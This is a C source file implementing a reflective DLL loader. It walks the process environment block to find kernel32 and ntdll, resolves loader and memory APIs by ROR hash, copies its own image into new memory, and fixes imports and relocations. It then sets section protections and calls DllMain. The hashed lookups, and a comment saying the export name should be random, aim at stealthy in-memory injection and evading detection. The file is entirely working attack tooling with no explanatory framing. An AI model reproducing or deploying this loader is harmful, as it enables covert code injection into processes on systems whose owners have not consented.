#include "loader.h"

// #define IMAGE_NT_SIGNATURE 0x00001223

__declspec(noinline) ULONG_PTR dllReturnBaseAddress(VOID) { return (ULONG_PTR)__builtin_return_address(0); }

// HINSTANCE hAppInstance = NULL;
// #pragma intrinsic( _ReturnAddress )
// __declspec(noinline) ULONG_PTR dllReturnBaseAddress(VOID) { return (ULONG_PTR)_ReturnAddress(); }

//name should be totally random dlltest
DLLEXPORT ULONG_PTR WINAPI boxit(LPVOID lpParameter) {
	LOADLIBRARYA pLoadLibraryA = NULL;
	GETPROCADDRESS pGetProcAddress = NULL;
	VIRTUALALLOC pVirtualAlloc = NULL;
    VIRTUALPROTECT pVirtualProtect = NULL;
	NTFLUSHINSTRUCTIONCACHE pNtFlushInstructionCache = NULL;

	USHORT Counter;

	// the initial location of this image in memory
	ULONG_PTR dllOldBaseAddress;
	// the kernels base address and later this images newly loaded base address
	ULONG_PTR dllNewBaseAddress;

	// variables for processing the kernels export table
	ULONG_PTR dllAddressArray;
	ULONG_PTR dllNameArray;
	ULONG_PTR dllExportDir;
	ULONG_PTR dllNameOrdinals;
	DWORD dllHashValue;

	dllOldBaseAddress = dllReturnBaseAddress();

	ULONG_PTR dllPEHeader;
	ULONG_PTR dllFirstEntry;
	ULONG_PTR dllSecondEntry;
	ULONG_PTR dllHashName;

	// Find the real PE Header in memory
	while (TRUE) {
		// if (((PIMAGE_DOS_HEADER)dllOldBaseAddress)->e_magic == IMAGE_DOS_SIGNATURE) {
			dllPEHeader = ((PIMAGE_DOS_HEADER)dllOldBaseAddress)->e_lfanew;
			// some x64 dll's can trigger a bogus signature (IMAGE_DOS_SIGNATURE == 'POP r10'),
			// we sanity check the e_lfanew with an upper threshold value of 1024 to avoid problems.
			if (dllPEHeader >= sizeof(IMAGE_DOS_HEADER) && dllPEHeader < 1024)
			{
				dllPEHeader += dllOldBaseAddress;
				// break if we have found a valid MZ/PE header
				if (((PIMAGE_NT_HEADERS)dllPEHeader)->Signature == IMAGE_NT_SIGNATURE) {
					break;
				}
			}
		// }
		dllOldBaseAddress--;
	}

	// Get PEB for x64 = gs: 0x60, use readfsdword( 0x30 ) for x86;
	dllNewBaseAddress = __readgsqword(0x60);
	// get the processes loaded modules. ref: http://msdn.microsoft.com/en-us/library/aa813708(VS.85).aspx
	dllNewBaseAddress = (ULONG_PTR)((_PPEB)dllNewBaseAddress)->pLdr;

	// get the first entry of the InMemoryOrder module list => InMemoryOrderModuleList – The order in which the modules(exes or dlls) get stored in memory
	dllFirstEntry = (ULONG_PTR)((PPEB_LDR_DATA)dllNewBaseAddress)->InMemoryOrderModuleList.Flink;

	while (dllFirstEntry)
	{
		// get pointer to current modules name (unicode string) => dt ntdll!_LDR_DATA_TABLE_ENTRY -b
		dllSecondEntry = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)dllFirstEntry)->BaseDllName.pBuffer;
		// set bCounter to the length for the loop
		Counter = ((PLDR_DATA_TABLE_ENTRY)dllFirstEntry)->BaseDllName.Length;
		// clear uiValueC which will store the hash of the module name
		dllHashName = 0;

		// compute the hash of the module name...
		do
		{
			dllHashName = ror((DWORD)dllHashName);
			// normalize to uppercase if the madule name is in lowercase
			if (*((BYTE*)dllSecondEntry) >= 'a') {
				dllHashName += *((BYTE*)dllSecondEntry) - 0x20;
			}
			else {
				dllHashName += *((BYTE*)dllSecondEntry);
			}
			dllSecondEntry++;
		} while (--Counter);

		// compare the hash with that of kernel32.dll
		if ((DWORD)dllHashName == KERNEL32DLL_HASH){
			// get this modules base address
			dllNewBaseAddress = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)dllFirstEntry)->DllBase;

			// get the Virtual Address of the modules NT Header
			dllExportDir = dllNewBaseAddress + ((PIMAGE_DOS_HEADER)dllNewBaseAddress)->e_lfanew;

			// dllNameArray = the address of the modules export directory entry
			dllNameArray = (ULONG_PTR) & ((PIMAGE_NT_HEADERS)dllExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

			// get the Virtual Address of the export directory
			dllExportDir = (dllNewBaseAddress + ((PIMAGE_DATA_DIRECTORY)dllNameArray)->VirtualAddress);

			// get the Virtual Address for the array of name pointers
			dllNameArray = (dllNewBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)dllExportDir)->AddressOfNames);

			// get the Virtual Address for the array of name ordinals
			dllNameOrdinals = (dllNewBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)dllExportDir)->AddressOfNameOrdinals);

			Counter = 4;

			// loop while we still have imports to find
			while (Counter > 0)
			{
				// compute the ROR hash values for this function name
				dllHashValue = RORhash((char*)(dllNewBaseAddress + DEREF_32(dllNameArray)));

				// if we have found a function we want we get its virtual address
				if (dllHashValue == LOADLIBRARYA_HASH || dllHashValue == GETPROCADDRESS_HASH || dllHashValue == VIRTUALALLOC_HASH || dllHashValue == VIRTUALPROTECT_HASH)
				{
					// get the Virtual Address for the array of addresses
					dllAddressArray = (dllNewBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)dllExportDir)->AddressOfFunctions);

					// use this functions name ordinal as an index into the array of name pointers
					dllAddressArray += (DEREF_16(dllNameOrdinals) * sizeof(DWORD));

					// store these functions Virtual Address
					if (dllHashValue == LOADLIBRARYA_HASH) {
						pLoadLibraryA = (LOADLIBRARYA)(dllNewBaseAddress + DEREF_32(dllAddressArray));
					} else if (dllHashValue == GETPROCADDRESS_HASH) {
						pGetProcAddress = (GETPROCADDRESS)(dllNewBaseAddress + DEREF_32(dllAddressArray));
					} else if (dllHashValue == VIRTUALALLOC_HASH) {
						pVirtualAlloc = (VIRTUALALLOC)(dllNewBaseAddress + DEREF_32(dllAddressArray));
					} else if (dllHashValue == VIRTUALPROTECT_HASH) {
						pVirtualProtect = (VIRTUALPROTECT)(dllNewBaseAddress + DEREF_32(dllAddressArray));
					}
					// decrement our counter
					Counter--;
				}

				// get the next exported function name
				dllNameArray += sizeof(DWORD);

				// get the next exported function name ordinal
				dllNameOrdinals += sizeof(WORD);
			}

		}
		else if ((DWORD)dllHashName == NTDLLDLL_HASH)
		{
			// get this modules base address
			dllNewBaseAddress = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)dllFirstEntry)->DllBase;

			// get the VA of the modules NT Header
			dllExportDir = dllNewBaseAddress + ((PIMAGE_DOS_HEADER)dllNewBaseAddress)->e_lfanew;

			// dllNameArray = the address of the modules export directory entry
			dllNameArray = (ULONG_PTR) & ((PIMAGE_NT_HEADERS)dllExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

			// get the VA of the export directory
			dllExportDir = (dllNewBaseAddress + ((PIMAGE_DATA_DIRECTORY)dllNameArray)->VirtualAddress);

			// get the VA for the array of name pointers
			dllNameArray = (dllNewBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)dllExportDir)->AddressOfNames);

			// get the VA for the array of name ordinals
			dllNameOrdinals = (dllNewBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)dllExportDir)->AddressOfNameOrdinals);

			Counter = 1;

			// loop while we still have imports to find
			while (Counter > 0)
			{
				// compute the ROR hash values for this function name
				dllHashValue = RORhash((char*)(dllNewBaseAddress + DEREF_32(dllNameArray)));

				// if we have found a function we want we get its virtual address
				if (dllHashValue == NTFLUSHINSTRUCTIONCACHE_HASH)
				{
					// get the VA for the array of addresses
					dllAddressArray = (dllNewBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)dllExportDir)->AddressOfFunctions);

					// use this functions name ordinal as an index into the array of name pointers
					dllAddressArray += (DEREF_16(dllNameOrdinals) * sizeof(DWORD));

					// store this functions VA
					pNtFlushInstructionCache = (NTFLUSHINSTRUCTIONCACHE)(dllNewBaseAddress + DEREF_32(dllAddressArray));

					// decrement our counter
					Counter--;
				}

				// get the next exported function name
				dllNameArray += sizeof(DWORD);

				// get the next exported function name ordinal
				dllNameOrdinals += sizeof(WORD);
			}
		}

		// we stop searching when we have found everything we need.
		if (pLoadLibraryA && pGetProcAddress && pVirtualAlloc && pNtFlushInstructionCache) {
			break;
		}

		// get the next entry
		dllFirstEntry = DEREF(dllFirstEntry);
	}

	// Load our image into a new permanent location in memory...
	// get the VA of the NT Header for the PE to be loaded
	dllPEHeader = dllOldBaseAddress + ((PIMAGE_DOS_HEADER)dllOldBaseAddress)->e_lfanew;

	//save the old pointer
	ULONG pOldNtHeader = dllPEHeader;

	// allocate all the memory for the DLL to be loaded into. we can load at any address because we will  
	// relocate the image. Also zeros all memory and marks it as READ, WRITE and EXECUTE to avoid any problems.
	// dllNewBaseAddress = (ULONG_PTR)pVirtualAlloc(NULL, ((PIMAGE_NT_HEADERS)dllPEHeader)->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	dllNewBaseAddress = (ULONG_PTR)pVirtualAlloc(NULL, ((PIMAGE_NT_HEADERS)dllPEHeader)->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	ULONG_PTR dllThisPEHeader;
	ULONG_PTR dllThisLibraryAddress;
	ULONG_PTR dllThisLibraryBaseAddress;
	ULONG_PTR dllTempAddress;

	// we must now copy over the headers
	dllThisPEHeader = ((PIMAGE_NT_HEADERS)dllPEHeader)->OptionalHeader.SizeOfHeaders;
	dllThisLibraryAddress = dllOldBaseAddress;
	dllThisLibraryBaseAddress = dllNewBaseAddress;

	while (dllThisPEHeader--) {
		*(BYTE*)dllThisLibraryBaseAddress++ = *(BYTE*)dllThisLibraryAddress++;
	}

	//-------------------------------------------------------Not checked below
	// Load in all of our sections...
	dllThisPEHeader = ((ULONG_PTR) & ((PIMAGE_NT_HEADERS)dllPEHeader)->OptionalHeader + ((PIMAGE_NT_HEADERS)dllPEHeader)->FileHeader.SizeOfOptionalHeader);

	// itterate through all sections, loading them into memory.
	dllFirstEntry = ((PIMAGE_NT_HEADERS)dllPEHeader)->FileHeader.NumberOfSections;
	while (dllFirstEntry--)
	{
		// uiValueB is the VA for this section
		dllThisLibraryAddress = (dllNewBaseAddress + ((PIMAGE_SECTION_HEADER)dllThisPEHeader)->VirtualAddress);

		// uiValueC if the VA for this sections data
		dllThisLibraryBaseAddress = (dllOldBaseAddress + ((PIMAGE_SECTION_HEADER)dllThisPEHeader)->PointerToRawData);

		// copy the section over
		dllTempAddress = ((PIMAGE_SECTION_HEADER)dllThisPEHeader)->SizeOfRawData;

		while (dllTempAddress--) {
			*(BYTE*)dllThisLibraryAddress++ = *(BYTE*)dllThisLibraryBaseAddress++;
		}

		// get the VA of the next section
		dllThisPEHeader += sizeof(IMAGE_SECTION_HEADER);
	}

	// STEP 4: process our images import table...
	// uiValueB = the address of the import directory
	dllThisLibraryAddress = (ULONG_PTR) & ((PIMAGE_NT_HEADERS)dllPEHeader)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

	// we assume their is an import table to process
	// uiValueC is the first entry in the import table
	dllThisLibraryBaseAddress = (dllNewBaseAddress + ((PIMAGE_DATA_DIRECTORY)dllThisLibraryAddress)->VirtualAddress);

	// itterate through all imports
	while (((PIMAGE_IMPORT_DESCRIPTOR)dllThisLibraryBaseAddress)->Name)
	{
		// use LoadLibraryA to load the imported module into memory
		dllOldBaseAddress = (ULONG_PTR)pLoadLibraryA((LPCSTR)(dllNewBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)dllThisLibraryBaseAddress)->Name));

		// uiValueD = VA of the OriginalFirstThunk
		dllTempAddress = (dllNewBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)dllThisLibraryBaseAddress)->OriginalFirstThunk);

		// uiValueA = VA of the IAT (via first thunk not origionalfirstthunk)
		dllThisPEHeader = (dllNewBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)dllThisLibraryBaseAddress)->FirstThunk);

		// itterate through all imported functions, importing by ordinal if no name present
		while (DEREF(dllThisPEHeader))
		{
			// sanity check uiValueD as some compilers only import by FirstThunk
			if (dllTempAddress && ((PIMAGE_THUNK_DATA)dllTempAddress)->u1.Ordinal & IMAGE_ORDINAL_FLAG)
			{
				// get the VA of the modules NT Header
				dllExportDir = dllOldBaseAddress + ((PIMAGE_DOS_HEADER)dllOldBaseAddress)->e_lfanew;

				// uiNameArray = the address of the modules export directory entry
				dllNameArray = (ULONG_PTR) & ((PIMAGE_NT_HEADERS)dllExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

				// get the VA of the export directory
				dllExportDir = (dllOldBaseAddress + ((PIMAGE_DATA_DIRECTORY)dllNameArray)->VirtualAddress);

				// get the VA for the array of addresses
				dllAddressArray = (dllOldBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)dllExportDir)->AddressOfFunctions);

				// use the import ordinal (- export ordinal base) as an index into the array of addresses
				dllAddressArray += ((IMAGE_ORDINAL(((PIMAGE_THUNK_DATA)dllTempAddress)->u1.Ordinal) - ((PIMAGE_EXPORT_DIRECTORY)dllExportDir)->Base) * sizeof(DWORD));

				// patch in the address for this imported function
				DEREF(dllThisPEHeader) = (dllOldBaseAddress + DEREF_32(dllAddressArray));
			}
			else
			{
				// get the VA of this functions import by name struct
				dllThisLibraryAddress = (dllNewBaseAddress + DEREF(dllThisPEHeader));

				// use GetProcAddress and patch in the address for this imported function
				DEREF(dllThisPEHeader) = (ULONG_PTR)pGetProcAddress((HMODULE)dllOldBaseAddress, (LPCSTR)((PIMAGE_IMPORT_BY_NAME)dllThisLibraryAddress)->Name);
			}
			// get the next imported function
			dllThisPEHeader += sizeof(ULONG_PTR);
			if (dllTempAddress) {
				dllTempAddress += sizeof(ULONG_PTR);
			}
		}

		// get the next import
		dllThisLibraryBaseAddress += sizeof(IMAGE_IMPORT_DESCRIPTOR);
	}

	// Process all of our images relocations...
	// calculate the base address delta and perform relocations (even if we load at desired image base)
	dllOldBaseAddress = dllNewBaseAddress - ((PIMAGE_NT_HEADERS)dllPEHeader)->OptionalHeader.ImageBase;

	// uiValueB = the address of the relocation directory
	dllThisLibraryAddress = (ULONG_PTR) & ((PIMAGE_NT_HEADERS)dllPEHeader)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	// check if their are any relocations present
	if (((PIMAGE_DATA_DIRECTORY)dllThisLibraryAddress)->Size)
	{
		// uiValueC is now the first entry (IMAGE_BASE_RELOCATION)
		dllThisLibraryBaseAddress = (dllNewBaseAddress + ((PIMAGE_DATA_DIRECTORY)dllThisLibraryAddress)->VirtualAddress);

		// and we itterate through all entries...
		while (((PIMAGE_BASE_RELOCATION)dllThisLibraryBaseAddress)->SizeOfBlock)
		{
			// uiValueA = the VA for this relocation block
			dllThisPEHeader = (dllNewBaseAddress + ((PIMAGE_BASE_RELOCATION)dllThisLibraryBaseAddress)->VirtualAddress);

			// uiValueB = number of entries in this relocation block
			dllThisLibraryAddress = (((PIMAGE_BASE_RELOCATION)dllThisLibraryBaseAddress)->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC);

			// uiValueD is now the first entry in the current relocation block
			dllTempAddress = dllThisLibraryBaseAddress + sizeof(IMAGE_BASE_RELOCATION);

			// we itterate through all the entries in the current block...
			while (dllThisLibraryAddress--)
			{
				// perform the relocation, skipping IMAGE_REL_BASED_ABSOLUTE as required.
				// we dont use a switch statement to avoid the compiler building a jump table
				// which would not be very position independent!
				if (((PIMAGE_RELOC)dllTempAddress)->type == IMAGE_REL_BASED_DIR64)
					* (ULONG_PTR*)(dllThisPEHeader + ((PIMAGE_RELOC)dllTempAddress)->offset) += dllOldBaseAddress;
				else if (((PIMAGE_RELOC)dllTempAddress)->type == IMAGE_REL_BASED_HIGHLOW)
					* (DWORD*)(dllThisPEHeader + ((PIMAGE_RELOC)dllTempAddress)->offset) += (DWORD)dllOldBaseAddress;
				else if (((PIMAGE_RELOC)dllTempAddress)->type == IMAGE_REL_BASED_HIGH)
					* (WORD*)(dllThisPEHeader + ((PIMAGE_RELOC)dllTempAddress)->offset) += HIWORD(dllOldBaseAddress);
				else if (((PIMAGE_RELOC)dllTempAddress)->type == IMAGE_REL_BASED_LOW)
					* (WORD*)(dllThisPEHeader + ((PIMAGE_RELOC)dllTempAddress)->offset) += LOWORD(dllOldBaseAddress);

				// get the next entry in the current relocation block
				dllTempAddress += sizeof(IMAGE_RELOC);
			}

			// get the next entry in the relocation directory
			dllThisLibraryBaseAddress = dllThisLibraryBaseAddress + ((PIMAGE_BASE_RELOCATION)dllThisLibraryBaseAddress)->SizeOfBlock;
		}
	}

	// call our images entry point
	// uiValueA = the VA of our newly loaded DLL/EXE's entry point
	dllThisPEHeader = (dllNewBaseAddress + ((PIMAGE_NT_HEADERS)dllPEHeader)->OptionalHeader.AddressOfEntryPoint);

	// We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing.
	pNtFlushInstructionCache((HANDLE)-1, NULL, 0);

	// modify allocated regions
	DWORD numberOfSections = ((PIMAGE_NT_HEADERS)pOldNtHeader)->FileHeader.NumberOfSections;
	ULONG_PTR pSectionHeader = ((ULONG_PTR) & ((PIMAGE_NT_HEADERS)pOldNtHeader)->OptionalHeader + ((PIMAGE_NT_HEADERS)pOldNtHeader)->FileHeader.SizeOfOptionalHeader);
	while (numberOfSections--) {
		void* thisSectionVA = (void*) (dllNewBaseAddress + ((PIMAGE_SECTION_HEADER)pSectionHeader)->VirtualAddress);
		ULONG_PTR thisSectionVirtualSize = ((PIMAGE_SECTION_HEADER)pSectionHeader)->Misc.VirtualSize;
		DWORD ulPermissions = 0;

		if (((PIMAGE_SECTION_HEADER)pSectionHeader)->Characteristics & IMAGE_SCN_MEM_WRITE) {
			ulPermissions = PAGE_WRITECOPY;
		}
		if (((PIMAGE_SECTION_HEADER)pSectionHeader)->Characteristics & IMAGE_SCN_MEM_READ) {
			ulPermissions = PAGE_READONLY;
		}
		if ((((PIMAGE_SECTION_HEADER)pSectionHeader)->Characteristics & IMAGE_SCN_MEM_WRITE) && (((PIMAGE_SECTION_HEADER)pSectionHeader)->Characteristics & IMAGE_SCN_MEM_READ)) {
			ulPermissions = PAGE_READWRITE;
		}
		if (((PIMAGE_SECTION_HEADER)pSectionHeader)->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
			ulPermissions = PAGE_EXECUTE;
		}
		if ((((PIMAGE_SECTION_HEADER)pSectionHeader)->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (((PIMAGE_SECTION_HEADER)pSectionHeader)->Characteristics & IMAGE_SCN_MEM_WRITE)) {
			ulPermissions = PAGE_EXECUTE_WRITECOPY;
		}
		if ((((PIMAGE_SECTION_HEADER)pSectionHeader)->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (((PIMAGE_SECTION_HEADER)pSectionHeader)->Characteristics & IMAGE_SCN_MEM_READ)) {
			ulPermissions = PAGE_EXECUTE_READ;
		}
		if ((((PIMAGE_SECTION_HEADER)pSectionHeader)->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (((PIMAGE_SECTION_HEADER)pSectionHeader)->Characteristics & IMAGE_SCN_MEM_WRITE) && 
				(((PIMAGE_SECTION_HEADER)pSectionHeader)->Characteristics & IMAGE_SCN_MEM_READ)) {
			ulPermissions = PAGE_EXECUTE_READWRITE;
		}

		pVirtualProtect(thisSectionVA, thisSectionVirtualSize, ulPermissions, &ulPermissions);
		pSectionHeader += sizeof(IMAGE_SECTION_HEADER);
	}

	((DLLMAIN)dllThisPEHeader)((HINSTANCE)dllNewBaseAddress, DLL_PROCESS_ATTACH, lpParameter);
	// Return our new entry point address so whatever called us can call DllMain() if needed.
	return dllThisPEHeader;
}
